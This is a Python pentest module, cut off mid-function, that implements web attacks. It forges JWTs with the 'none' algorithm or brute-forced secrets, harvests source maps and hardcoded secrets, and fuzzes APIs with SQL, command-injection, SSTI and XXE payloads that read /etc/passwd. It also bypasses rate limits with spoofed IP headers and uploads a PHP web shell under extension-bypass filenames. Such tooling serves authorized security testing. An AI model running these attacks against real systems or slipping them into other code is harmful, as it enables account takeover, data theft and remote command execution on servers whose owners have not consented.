"""
Deep Penetration Testing Module
===============================
Advanced techniques for thorough security assessment.

Addresses gaps in:
- JWT/Auth bypass
- Source map recovery
- API fuzzing
- File upload exploitation
- WebSocket testing
- Rate limit bypass
- Business logic testing

Author: DeadMan Pentest Suite
Version: 1.0.0
"""

import re
import json
import base64
import hashlib
import time
import asyncio
from typing import Optional, List, Dict, Any, Set, Tuple
from dataclasses import dataclass, field
from enum import Enum
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests


class Severity(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class DeepFinding:
    """Security finding from deep testing"""
    title: str
    severity: Severity
    category: str
    url: str
    description: str
    evidence: str = ""
    request: Optional[str] = None
    response: Optional[str] = None
    remediation: str = ""
    cwe: Optional[str] = None

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "severity": self.severity.value,
            "category": self.category,
            "url": self.url,
            "description": self.description,
            "evidence": self.evidence,
            "remediation": self.remediation,
            "cwe": self.cwe
        }


# =============================================================================
# JWT ANALYZER & EXPLOITER
# =============================================================================

class JWTAnalyzer:
    """
    JWT Token Analysis and Exploitation.

    Capabilities:
    - Decode and analyze JWT structure
    - Test for algorithm confusion (none, HS256 with public key)
    - Brute force weak secrets
    - Token manipulation
    - Expiration bypass testing
    """

    COMMON_SECRETS = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "your-256-bit-secret", "your-secret-key", "changeme", "test",
        "development", "production", "supersecret", "mysecret",
    ]

    def __init__(self):
        self.findings: List[DeepFinding] = []

    def decode_jwt(self, token: str) -> Dict[str, Any]:
        """Decode JWT without verification"""
        parts = token.split('.')
        if len(parts) != 3:
            return {"error": "Invalid JWT format"}

        def decode_part(part: str) -> Dict:
            # Add padding
            padding = 4 - len(part) % 4
            if padding != 4:
                part += '=' * padding
            try:
                decoded = base64.urlsafe_b64decode(part)
                return json.loads(decoded)
            except Exception as e:
                return {"decode_error": str(e)}

        return {
            "header": decode_part(parts[0]),
            "payload": decode_part(parts[1]),
            "signature": parts[2][:20] + "..." if len(parts[2]) > 20 else parts[2]
        }

    def analyze_token(self, token: str) -> Dict[str, Any]:
        """Full JWT security analysis"""
        result = {
            "decoded": self.decode_jwt(token),
            "vulnerabilities": [],
            "recommendations": []
        }

        decoded = result["decoded"]
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})

        # Check algorithm
        alg = header.get("alg", "")
        if alg.lower() == "none":
            result["vulnerabilities"].append({
                "type": "algorithm_none",
                "severity": "critical",
                "description": "JWT uses 'none' algorithm - signature not verified"
            })
            self.findings.append(DeepFinding(
                title="JWT Algorithm None",
                severity=Severity.CRITICAL,
                category="authentication",
                url="",
                description="JWT accepts 'none' algorithm, allowing unsigned tokens",
                cwe="CWE-347"
            ))

        if alg.upper() == "HS256":
            result["recommendations"].append(
                "HS256 detected - test for weak secret and algorithm confusion"
            )

        # Check expiration
        exp = payload.get("exp")
        if exp:
            import datetime
            exp_time = datetime.datetime.fromtimestamp(exp)
            if exp_time < datetime.datetime.now():
                result["vulnerabilities"].append({
                    "type": "expired_token",
                    "severity": "info",
                    "description": f"Token expired at {exp_time}"
                })
            elif (exp_time - datetime.datetime.now()).days > 365:
                result["vulnerabilities"].append({
                    "type": "long_expiration",
                    "severity": "low",
                    "description": f"Token has very long expiration: {exp_time}"
                })
        else:
            result["vulnerabilities"].append({
                "type": "no_expiration",
                "severity": "medium",
                "description": "JWT has no expiration claim"
            })

        # Check for sensitive data in payload
        sensitive_keys = ["password", "secret", "key", "token", "ssn", "credit"]
        for key in payload.keys():
            if any(s in key.lower() for s in sensitive_keys):
                result["vulnerabilities"].append({
                    "type": "sensitive_data",
                    "severity": "medium",
                    "description": f"Potentially sensitive data in JWT: {key}"
                })

        return result

    def test_algorithm_none(self, token: str) -> Optional[str]:
        """Generate token with 'none' algorithm"""
        decoded = self.decode_jwt(token)
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})

        # Create header with alg: none
        none_header = {"alg": "none", "typ": "JWT"}

        def encode_part(data: Dict) -> str:
            encoded = base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            return encoded

        return f"{encode_part(none_header)}.{encode_part(payload)}."

    def brute_force_secret(self, token: str, wordlist: List[str] = None) -> Optional[str]:
        """Attempt to brute force JWT secret"""
        try:
            import hmac
        except ImportError:
            return None

        wordlist = wordlist or self.COMMON_SECRETS
        parts = token.split('.')
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}"
        signature = parts[2]

        # Add padding to signature
        padding = 4 - len(signature) % 4
        if padding != 4:
            signature += '=' * padding

        try:
            target_sig = base64.urlsafe_b64decode(signature)
        except Exception:
            return None

        for secret in wordlist:
            computed = hmac.new(
                secret.encode(),
                message.encode(),
                hashlib.sha256
            ).digest()

            if computed == target_sig:
                self.findings.append(DeepFinding(
                    title="Weak JWT Secret",
                    severity=Severity.CRITICAL,
                    category="authentication",
                    url="",
                    description=f"JWT secret cracked: {secret}",
                    evidence=f"Secret: {secret}",
                    cwe="CWE-521"
                ))
                return secret

        return None

    def forge_token(self, token: str, new_claims: Dict, secret: str = None) -> str:
        """Forge a new JWT with modified claims"""
        decoded = self.decode_jwt(token)
        header = decoded.get("header", {})
        payload = decoded.get("payload", {})

        # Merge new claims
        payload.update(new_claims)

        def encode_part(data: Dict) -> str:
            encoded = base64.urlsafe_b64encode(
                json.dumps(data, separators=(',', ':')).encode()
            ).decode().rstrip('=')
            return encoded

        message = f"{encode_part(header)}.{encode_part(payload)}"

        if secret:
            import hmac
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
            return f"{message}.{signature}"
        else:
            # Use none algorithm
            none_header = {"alg": "none", "typ": "JWT"}
            return f"{encode_part(none_header)}.{encode_part(payload)}."


# =============================================================================
# SOURCE MAP HUNTER
# =============================================================================

class SourceMapHunter:
    """
    Aggressive source map and build artifact recovery.

    Capabilities:
    - Hunt for .map files
    - Extract original source from maps
    - Webpack chunk analysis
    - Build manifest extraction
    - Route discovery from source
    """

    MAP_EXTENSIONS = ['.map', '.js.map', '.css.map']

    BUILD_ARTIFACTS = [
        '/_next/static/chunks/webpack-*.js',
        '/_next/static/development/_buildManifest.js',
        '/_next/static/development/_ssgManifest.js',
        '/_next/static/{buildId}/_buildManifest.js',
        '/_next/static/{buildId}/_ssgManifest.js',
        '/static/js/main.*.chunk.js.map',
        '/static/js/*.chunk.js.map',
        '/static/css/main.*.chunk.css.map',
        '/build/static/js/main.*.js.map',
        '/assets/index-*.js.map',
        '/dist/bundle.js.map',
        '/bundle.js.map',
        '/.map',
        '/app.js.map',
        '/main.js.map',
        '/vendor.js.map',
    ]

    def __init__(self, timeout: int = 15):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.findings: List[DeepFinding] = []
        self.recovered_sources: Dict[str, str] = {}

    def hunt_source_maps(self, base_url: str, js_urls: List[str] = None) -> Dict[str, Any]:
        """
        Aggressively hunt for source maps.

        Args:
            base_url: Target base URL
            js_urls: Known JavaScript URLs to check

        Returns:
            Found source maps and extracted sources
        """
        results = {
            "maps_found": [],
            "sources_recovered": 0,
            "routes_discovered": [],
            "api_endpoints": [],
            "secrets": []
        }

        # Method 1: Check known JS files for sourceMappingURL
        if js_urls:
            for js_url in js_urls:
                map_url = self._find_map_from_js(js_url)
                if map_url:
                    results["maps_found"].append(map_url)

        # Method 2: Brute force common map locations
        map_urls = self._brute_force_maps(base_url)
        results["maps_found"].extend(map_urls)

        # Method 3: Check build artifacts
        artifacts = self._check_build_artifacts(base_url)
        results["build_artifacts"] = artifacts

        # Extract sources from found maps
        for map_url in results["maps_found"]:
            sources = self._extract_sources(map_url)
            if sources:
                results["sources_recovered"] += len(sources)
                self.recovered_sources.update(sources)

                # Analyze recovered sources
                for filename, content in sources.items():
                    # Find routes
                    routes = self._extract_routes(content)
                    results["routes_discovered"].extend(routes)

                    # Find API endpoints
                    endpoints = self._extract_api_endpoints(content)
                    results["api_endpoints"].extend(endpoints)

                    # Find secrets
                    secrets = self._scan_for_secrets(content, filename)
                    results["secrets"].extend(secrets)

        # Deduplicate
        results["routes_discovered"] = list(set(results["routes_discovered"]))
        results["api_endpoints"] = list(set(results["api_endpoints"]))

        return results

    def _find_map_from_js(self, js_url: str) -> Optional[str]:
        """Find source map URL from JS file"""
        try:
            resp = self.session.get(js_url, timeout=self.timeout)
            content = resp.text

            # Check for sourceMappingURL comment
            match = re.search(r'//[#@]\s*sourceMappingURL=(.+?)(?:\s|$)', content)
            if match:
                map_path = match.group(1)
                if not map_path.startswith('http'):
                    map_path = urljoin(js_url, map_path)

                # Verify it exists
                resp = self.session.head(map_path, timeout=5)
                if resp.status_code == 200:
                    self.findings.append(DeepFinding(
                        title="Source Map Exposed",
                        severity=Severity.MEDIUM,
                        category="information_disclosure",
                        url=map_path,
                        description="JavaScript source map is publicly accessible",
                        cwe="CWE-540"
                    ))
                    return map_path

            # Try appending .map
            map_url = js_url + '.map'
            resp = self.session.head(map_url, timeout=5)
            if resp.status_code == 200:
                return map_url

        except Exception:
            pass

        return None

    def _brute_force_maps(self, base_url: str) -> List[str]:
        """Brute force common source map locations"""
        found = []

        # Common paths to check
        paths = [
            '/main.js.map', '/app.js.map', '/bundle.js.map',
            '/vendor.js.map', '/runtime.js.map', '/polyfills.js.map',
            '/scripts.js.map', '/styles.css.map', '/index.js.map',
        ]

        def check_path(path: str) -> Optional[str]:
            url = urljoin(base_url, path)
            try:
                resp = self.session.head(url, timeout=5)
                if resp.status_code == 200:
                    return url
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_path, p): p for p in paths}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    found.append(result)

        return found

    def _check_build_artifacts(self, base_url: str) -> List[Dict]:
        """Check for exposed build artifacts"""
        artifacts = []

        # Get the page to find buildId
        try:
            resp = self.session.get(base_url, timeout=self.timeout)

            # Find Next.js buildId
            build_match = re.search(r'/_next/static/([a-zA-Z0-9_-]+)/', resp.text)
            build_id = build_match.group(1) if build_match else None

            # Check common artifact paths
            paths_to_check = [
                '/_next/static/chunks/webpack.js',
                '/_next/static/development/_buildManifest.js',
                '/.next/build-manifest.json',
                '/.next/prerender-manifest.json',
                '/.next/routes-manifest.json',
                '/build-manifest.json',
            ]

            if build_id:
                paths_to_check.extend([
                    f'/_next/static/{build_id}/_buildManifest.js',
                    f'/_next/static/{build_id}/_ssgManifest.js',
                ])

            for path in paths_to_check:
                url = urljoin(base_url, path)
                try:
                    resp = self.session.get(url, timeout=5)
                    if resp.status_code == 200:
                        artifacts.append({
                            "path": path,
                            "url": url,
                            "size": len(resp.text),
                            "content_preview": resp.text[:200]
                        })
                except Exception:
                    pass

        except Exception:
            pass

        return artifacts

    def _extract_sources(self, map_url: str) -> Dict[str, str]:
        """Extract original sources from source map"""
        sources = {}

        try:
            resp = self.session.get(map_url, timeout=self.timeout)
            map_data = resp.json()

            source_names = map_data.get('sources', [])
            source_contents = map_data.get('sourcesContent', [])

            for i, name in enumerate(source_names):
                if i < len(source_contents) and source_contents[i]:
                    sources[name] = source_contents[i]

        except Exception:
            pass

        return sources

    def _extract_routes(self, content: str) -> List[str]:
        """Extract route definitions from source"""
        routes = set()

        # React Router patterns
        patterns = [
            r'path:\s*["\']([^"\']+)["\']',
            r'to:\s*["\']([^"\']+)["\']',
            r'href:\s*["\']([^"\']+)["\']',
            r'navigate\(["\']([^"\']+)["\']',
            r'push\(["\']([^"\']+)["\']',
            r'Route\s+path=["\']([^"\']+)["\']',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content)
            for match in matches:
                if match.startswith('/') and not match.startswith('//'):
                    routes.add(match)

        return list(routes)

    def _extract_api_endpoints(self, content: str) -> List[str]:
        """Extract API endpoints from source"""
        endpoints = set()

        patterns = [
            r'fetch\(["\']([^"\']+/api/[^"\']+)["\']',
            r'axios\.[a-z]+\(["\']([^"\']+)["\']',
            r'["\'](/api/[^"\']+)["\']',
            r'baseURL:\s*["\']([^"\']+)["\']',
            r'endpoint:\s*["\']([^"\']+)["\']',
        ]

        for pattern in patterns:
            matches = re.findall(pattern, content)
            endpoints.update(matches)

        return list(endpoints)

    def _scan_for_secrets(self, content: str, filename: str) -> List[Dict]:
        """Scan source for hardcoded secrets"""
        secrets = []

        patterns = {
            'api_key': r'["\']?(?:api[_-]?key|apikey)["\']?\s*[:=]\s*["\']([^"\']{20,})["\']',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'private_key': r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----',
            'jwt_secret': r'["\']?(?:jwt[_-]?secret|secret[_-]?key)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'password': r'["\']?password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            'database_url': r'(?:mongodb|postgres|mysql)://[^\s"\']+',
        }

        for secret_type, pattern in patterns.items():
            matches = re.finditer(pattern, content, re.I)
            for match in matches:
                value = match.group(0)
                # Skip obvious placeholders
                if any(p in value.lower() for p in ['example', 'placeholder', 'your_', 'xxx']):
                    continue

                secrets.append({
                    "type": secret_type,
                    "file": filename,
                    "value": value[:50] + "..." if len(value) > 50 else value,
                    "line": content[:match.start()].count('\n') + 1
                })

                self.findings.append(DeepFinding(
                    title=f"Hardcoded Secret: {secret_type}",
                    severity=Severity.HIGH,
                    category="secrets",
                    url=filename,
                    description=f"Found {secret_type} in source code",
                    evidence=value[:50],
                    cwe="CWE-798"
                ))

        return secrets


# =============================================================================
# API FUZZER
# =============================================================================

class APIFuzzer:
    """
    Comprehensive API security fuzzer.

    Capabilities:
    - Parameter fuzzing
    - Method tampering
    - Content-Type manipulation
    - JSON injection
    - Error-based information disclosure
    """

    FUZZ_PAYLOADS = {
        'sqli': ["'", "\"", "' OR '1'='1", "1' AND '1'='1", "'; DROP TABLE--"],
        'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
        'ssti': ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
        'path_traversal': ["../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam"],
        'command_injection': ["; ls", "| cat /etc/passwd", "$(whoami)", "`id`"],
        'nosql': ["{'$gt': ''}", "{'$ne': null}", "true, $where: '1 == 1'"],
        'xxe': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
    }

    HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']

    CONTENT_TYPES = [
        'application/json',
        'application/xml',
        'application/x-www-form-urlencoded',
        'multipart/form-data',
        'text/plain',
        'text/xml',
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.findings: List[DeepFinding] = []

    def fuzz_endpoint(
        self,
        url: str,
        method: str = "GET",
        params: Dict = None,
        data: Dict = None,
        headers: Dict = None,
        fuzz_types: List[str] = None
    ) -> Dict[str, Any]:
        """
        Fuzz an API endpoint with various payloads.

        Args:
            url: Target URL
            method: HTTP method
            params: Query parameters
            data: Body data
            headers: Custom headers
            fuzz_types: Types of fuzzing to perform

        Returns:
            Fuzzing results
        """
        results = {
            "url": url,
            "method": method,
            "vulnerabilities": [],
            "errors_triggered": [],
            "interesting_responses": []
        }

        fuzz_types = fuzz_types or list(self.FUZZ_PAYLOADS.keys())

        # Fuzz each parameter
        if params:
            for param_name in params.keys():
                for fuzz_type in fuzz_types:
                    for payload in self.FUZZ_PAYLOADS.get(fuzz_type, []):
                        fuzzed_params = params.copy()
                        fuzzed_params[param_name] = payload

                        result = self._send_request(url, method, fuzzed_params, data, headers)
                        vuln = self._analyze_response(result, fuzz_type, payload, param_name)

                        if vuln:
                            results["vulnerabilities"].append(vuln)

        # Fuzz body data
        if data:
            for field_name in data.keys():
                for fuzz_type in fuzz_types:
                    for payload in self.FUZZ_PAYLOADS.get(fuzz_type, []):
                        fuzzed_data = data.copy()
                        fuzzed_data[field_name] = payload

                        result = self._send_request(url, method, params, fuzzed_data, headers)
                        vuln = self._analyze_response(result, fuzz_type, payload, field_name)

                        if vuln:
                            results["vulnerabilities"].append(vuln)

        return results

    def test_method_tampering(self, url: str, auth_headers: Dict = None) -> Dict[str, Any]:
        """Test HTTP method tampering"""
        results = {
            "url": url,
            "methods_tested": [],
            "accessible_methods": [],
            "findings": []
        }

        headers = auth_headers or {}
        headers['User-Agent'] = 'Mozilla/5.0'

        baseline = None

        for method in self.HTTP_METHODS:
            results["methods_tested"].append(method)

            try:
                resp = self.session.request(
                    method, url,
                    headers=headers,
                    timeout=self.timeout
                )

                result = {
                    "method": method,
                    "status": resp.status_code,
                    "length": len(resp.text),
                    "headers": dict(resp.headers)
                }

                if baseline is None and method == "GET":
                    baseline = result

                # Check for unexpected access
                if method in ["PUT", "DELETE", "PATCH"]:
                    if resp.status_code in [200, 201, 204]:
                        results["accessible_methods"].append(result)
                        self.findings.append(DeepFinding(
                            title=f"Unprotected {method} Method",
                            severity=Severity.MEDIUM,
                            category="access_control",
                            url=url,
                            description=f"{method} method accessible without proper authorization",
                            cwe="CWE-650"
                        ))

                # TRACE method check
                if method == "TRACE" and resp.status_code == 200:
                    results["findings"].append({
                        "type": "trace_enabled",
                        "severity": "medium",
                        "description": "TRACE method enabled - potential XST vulnerability"
                    })

            except Exception:
                pass

        return results

    def test_content_type_confusion(self, url: str, data: Dict) -> Dict[str, Any]:
        """Test Content-Type manipulation"""
        results = {
            "url": url,
            "tested_types": [],
            "accepted_types": [],
            "findings": []
        }

        for content_type in self.CONTENT_TYPES:
            results["tested_types"].append(content_type)

            try:
                headers = {'Content-Type': content_type}

                # Format data according to content type
                if 'json' in content_type:
                    body = json.dumps(data)
                elif 'xml' in content_type:
                    body = self._dict_to_xml(data)
                elif 'form-urlencoded' in content_type:
                    body = urlencode(data)
                else:
                    body = str(data)

                resp = self.session.post(
                    url,
                    data=body,
                    headers=headers,
                    timeout=self.timeout
                )

                if resp.status_code in [200, 201]:
                    results["accepted_types"].append({
                        "content_type": content_type,
                        "status": resp.status_code,
                        "response_type": resp.headers.get('Content-Type', '')
                    })

            except Exception:
                pass

        # Check for XML acceptance (potential XXE)
        xml_accepted = any('xml' in t['content_type'] for t in results["accepted_types"])
        if xml_accepted:
            self.findings.append(DeepFinding(
                title="XML Content Type Accepted",
                severity=Severity.MEDIUM,
                category="injection",
                url=url,
                description="Endpoint accepts XML content - test for XXE vulnerability",
                cwe="CWE-611"
            ))

        return results

    def _send_request(
        self,
        url: str,
        method: str,
        params: Dict = None,
        data: Dict = None,
        headers: Dict = None
    ) -> Dict:
        """Send request and capture response"""
        try:
            resp = self.session.request(
                method,
                url,
                params=params,
                json=data if data else None,
                headers=headers,
                timeout=self.timeout
            )

            return {
                "status": resp.status_code,
                "headers": dict(resp.headers),
                "body": resp.text[:5000],
                "time": resp.elapsed.total_seconds()
            }
        except Exception as e:
            return {"error": str(e)}

    def _analyze_response(
        self,
        response: Dict,
        fuzz_type: str,
        payload: str,
        param: str
    ) -> Optional[Dict]:
        """Analyze response for vulnerability indicators"""

        if "error" in response:
            return None

        body = response.get("body", "").lower()
        status = response.get("status", 0)

        # SQL injection indicators
        if fuzz_type == "sqli":
            sql_errors = [
                "sql syntax", "mysql", "sqlite", "postgresql", "oracle",
                "syntax error", "unclosed quotation", "quoted string not properly"
            ]
            if any(err in body for err in sql_errors):
                self.findings.append(DeepFinding(
                    title="Potential SQL Injection",
                    severity=Severity.HIGH,
                    category="injection",
                    url="",
                    description=f"SQL error triggered by payload in parameter: {param}",
                    evidence=payload,
                    cwe="CWE-89"
                ))
                return {"type": "sqli", "param": param, "payload": payload}

        # XSS reflection
        if fuzz_type == "xss":
            if payload.lower() in body:
                return {"type": "xss_reflection", "param": param, "payload": payload}

        # SSTI indicators
        if fuzz_type == "ssti":
            if "49" in body:  # 7*7
                self.findings.append(DeepFinding(
                    title="Server-Side Template Injection",
                    severity=Severity.CRITICAL,
                    category="injection",
                    url="",
                    description=f"SSTI detected in parameter: {param}",
                    evidence=payload,
                    cwe="CWE-94"
                ))
                return {"type": "ssti", "param": param, "payload": payload}

        # Error disclosure
        error_patterns = [
            "exception", "stack trace", "traceback", "error in",
            "fatal error", "parse error", "undefined", "null pointer"
        ]
        if any(err in body for err in error_patterns):
            return {"type": "error_disclosure", "param": param, "payload": payload}

        return None

    def _dict_to_xml(self, data: Dict, root: str = "root") -> str:
        """Convert dictionary to XML"""
        xml = f"<?xml version=\"1.0\"?><{root}>"
        for key, value in data.items():
            xml += f"<{key}>{value}</{key}>"
        xml += f"</{root}>"
        return xml


# =============================================================================
# RATE LIMIT BYPASS
# =============================================================================

class RateLimitBypass:
    """
    Rate limiting bypass techniques.

    Capabilities:
    - Header manipulation (X-Forwarded-For, X-Real-IP)
    - Case variation
    - Parameter pollution
    - Endpoint variation
    - Timing-based bypass
    """

    BYPASS_HEADERS = [
        ('X-Forwarded-For', '127.0.0.1'),
        ('X-Forwarded-For', '192.168.1.{i}'),
        ('X-Real-IP', '127.0.0.1'),
        ('X-Real-IP', '10.0.0.{i}'),
        ('X-Originating-IP', '127.0.0.1'),
        ('X-Remote-IP', '127.0.0.1'),
        ('X-Remote-Addr', '127.0.0.1'),
        ('X-Client-IP', '127.0.0.1'),
        ('X-Host', 'localhost'),
        ('X-Forwarded-Host', 'localhost'),
        ('True-Client-IP', '127.0.0.1'),
        ('Client-IP', '127.0.0.1'),
        ('CF-Connecting-IP', '127.0.0.1'),
        ('Fastly-Client-IP', '127.0.0.1'),
    ]

    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.session = requests.Session()
        self.findings: List[DeepFinding] = []

    def test_bypass_techniques(
        self,
        url: str,
        method: str = "GET",
        data: Dict = None,
        requests_per_technique: int = 10
    ) -> Dict[str, Any]:
        """
        Test various rate limit bypass techniques.

        Args:
            url: Target URL
            method: HTTP method
            data: Request body
            requests_per_technique: Number of requests per technique

        Returns:
            Bypass test results
        """
        results = {
            "url": url,
            "baseline_limit": None,
            "bypass_techniques": [],
            "successful_bypasses": []
        }

        # Establish baseline
        results["baseline_limit"] = self._find_rate_limit(url, method, data)

        # Test header-based bypass
        for header_name, header_value in self.BYPASS_HEADERS:
            success_count = 0

            for i in range(requests_per_technique):
                value = header_value.replace('{i}', str(i))
                headers = {header_name: value}

                try:
                    resp = self.session.request(
                        method, url,
                        json=data,
                        headers=headers,
                        timeout=self.timeout
                    )

                    if resp.status_code != 429:
                        success_count += 1

                except Exception:
                    pass

            technique = {
                "type": "header",
                "header": header_name,
                "success_rate": success_count / requests_per_technique
            }
            results["bypass_techniques"].append(technique)

            if success_count == requests_per_technique:
                results["successful_bypasses"].append(technique)
                self.findings.append(DeepFinding(
                    title="Rate Limit Bypass via Header",
                    severity=Severity.MEDIUM,
                    category="rate_limiting",
                    url=url,
                    description=f"Rate limit bypassed using {header_name} header",
                    evidence=f"Header: {header_name}",
                    cwe="CWE-770"
                ))

        # Test URL variation bypass
        url_variations = self._generate_url_variations(url)
        for var_url in url_variations:
            success_count = 0

            for _ in range(requests_per_technique):
                try:
                    resp = self.session.request(method, var_url, json=data, timeout=self.timeout)
                    if resp.status_code != 429:
                        success_count += 1
                except Exception:
                    pass

            if success_count == requests_per_technique:
                results["successful_bypasses"].append({
                    "type": "url_variation",
                    "url": var_url
                })

        return results

    def _find_rate_limit(self, url: str, method: str, data: Dict) -> Optional[int]:
        """Find the rate limit threshold"""
        for i in range(100):
            try:
                resp = self.session.request(method, url, json=data, timeout=self.timeout)
                if resp.status_code == 429:
                    return i
            except Exception:
                break
        return None

    def _generate_url_variations(self, url: str) -> List[str]:
        """Generate URL variations for bypass testing"""
        parsed = urlparse(url)
        variations = []

        # Case variations
        variations.append(url.upper())
        variations.append(url.replace(parsed.path, parsed.path.upper()))

        # Add trailing slash
        if not url.endswith('/'):
            variations.append(url + '/')

        # URL encoding variations
        variations.append(url.replace('/', '%2f'))

        # Double slash
        variations.append(url.replace('//', '///'))

        # Add dummy parameter
        separator = '&' if '?' in url else '?'
        variations.append(f"{url}{separator}_={int(time.time())}")

        return variations


# =============================================================================
# FILE UPLOAD TESTER
# =============================================================================

class FileUploadTester:
    """
    File upload vulnerability testing.

    Capabilities:
    - Extension bypass
    - Content-Type manipulation
    - Null byte injection
    - Path traversal
    - SVG/XML injection
    - Presigned URL exploitation
    """

    DANGEROUS_EXTENSIONS = [
        '.php', '.php5', '.phtml', '.phar',
        '.asp', '.aspx', '.ashx', '.asmx',
        '.jsp', '.jspx', '.jsw', '.jsv',
        '.exe', '.bat', '.cmd', '.sh',
        '.svg', '.xml', '.xsl', '.xslt',
        '.html', '.htm', '.shtml',
    ]

    BYPASS_TECHNIQUES = [
        # Double extension
        ('test.php.jpg', 'image/jpeg'),
        ('test.jpg.php', 'image/jpeg'),
        # Null byte
        ('test.php%00.jpg', 'image/jpeg'),
        ('test.php\x00.jpg', 'image/jpeg'),
        # Case variation
        ('test.PhP', 'application/x-php'),
        ('test.pHp', 'application/x-php'),
        # Special characters
        ('test.php;.jpg', 'image/jpeg'),
        ('test.php:.jpg', 'image/jpeg'),
        # Alternative extensions
        ('test.php5', 'application/x-php'),
        ('test.phtml', 'application/x-php'),
        # Content-Type mismatch
        ('test.jpg', 'application/x-php'),
    ]

    MALICIOUS_PAYLOADS = {
        'php_webshell': '<?php echo shell_exec($_GET["cmd"]); ?>',
        'svg_xss': '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">',
        'xml_xxe': '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        'html_xss': '<html><body><script>alert(document.domain)</script></body></html>',
    }

    def __init__(self, timeout: int = 30):
        self.timeout = timeout
        self.session = requests.Session()
        self.findings: List[DeepFinding] = []

    def test_upload_endpoint(
        self,
        url: str,
        file_param: str = "file",
        additional_data: Dict = None
    ) -> Dict[str, Any]:
        """
        Test file upload endpoint for vulnerabilities.

        Args:
            url: Upload endpoint URL
            file_param: File parameter name
            additional_data: Additional form data

        Returns:
            Test results
        """
        results = {
            "url": url,
            "accepted_extensions": [],
            "bypass_successful": [],
            "dangerous_uploads": [],
            "findings": []
        }

        # Test each bypass technique
        for filename, content_type in self.BYPASS_TECHNIQUES:
            # Determine payload based on extension
            ext = filename.split('.')[-1].lower()
            if 'php' in ext:
                content = self.MALICIOUS_PAYLOADS['php_webshell']
            elif ext == 'svg':
                content = self.MALICIOUS_PAYLOADS['svg_xss']
            elif ext == 'xml':
                content = self.MALICIOUS_PAYLOADS['xml_xxe']
            elif ext in ['html', 'htm']:
                content = self.MALICIOUS_PAYLOADS['html_xss']
            else:
                content = b'\x89PNG\r\n\x1a\n'  # PNG magic bytes

            try:
                files = {file_param: (filename, content, content_type)}
                data = additional_data or {}

                resp = self.session.post(
                    url,
                    files=files,
                    data=data,
                    timeout=self.timeout
                )

                if resp.status_code in [200, 201]:
                    results["accepted_extensions"].append(filename)

                    # Check if dangerous extension was accepted
                    if any(filename.lower().endswith(ext) for ext in self.DANGEROUS_EXTENSIONS):
                        results["dangerous_uploads"].append({
                            "filename": filename,
                            "content_type": content_type,
                            "response": resp.text[:500]
                        })

                        self.findings.append(DeepFinding(
                            title="Dangerous File Upload Allowed",
                            severity=Severity.HIGH,
                            category="file_upload",
                            url=url,
                            description=f"Server accepted upload of {filename}",
                            evidence=f"Filename: {filename}, Content-Type: {content_type}",
                            cwe="CWE-434"
                        ))

            except Exception:
                pass

        # Test path traversal in filename
        traversal_filenames = [
            '../../../tmp/test.txt',
            '..\\..\\..\\tmp\\test.txt',
            '....//....//....//tmp/test.txt',
        ]

        for filename in traversal_filenames:
            try:
                files = {file_param: (filename, 'test content', 'text/plain')}
                resp = self.session.post(url, files=files, timeout=self.timeout)

                if resp.status_code in [200, 201]:
                    results["bypass_successful"].append({
                        "type": "path_traversal",
                        "filename": filename
                    })

                    self.findings.append(DeepFinding(
                        title="Path Traversal in File Upload",
                        severity=Severity.HIGH,
                        category="file_upload",
                        url=url,
                        description="Server accepts path traversal in filename",
                        evidence=filename,
                        cwe="CWE-22"
                    ))

            except Exception:
                pass

        return results

    def test_presigned_url(self, presign_url: str, get_url_func) -> Dict[str, Any]:
        """
        Test presigned URL upload for vulnerabilities.

        Args:
            presign_url: URL to get presigned upload URL
            get_url_func: Function to extract upload URL from response

        Returns:
            Test results
        """
        results = {
            "presign_url": presign_url,
            "vulnerabilities": [],
            "findings": []
        }

        try:
            # Get presigned URL
            resp = self.session.post(presign_url, json={"filename": "test.txt"}, timeout=self.timeout)

            if resp.status_code == 200:
                upload_url = get_url_func(resp.json())

                # Test uploading different content types
                for ext, content in [
                    ('html', self.MALICIOUS_PAYLOADS['html_xss']),
                    ('svg', self.MALICIOUS_PAYLOADS['svg_xss']),
                ]:
                    try:
                        # Request presigned URL for dangerous extension
                        resp = self.session.post(
                            presign_url,
                            json={"filename": f"test.{ext}"},
                            timeout=self.timeout
                        )

                        if resp.status_code == 200:
                            results["vulnerabilities"].append({
                                "type": "dangerous_extension_presigned",
                                "extension": ext
                            })

                    except Exception:
                        pass

        except Exception as e:
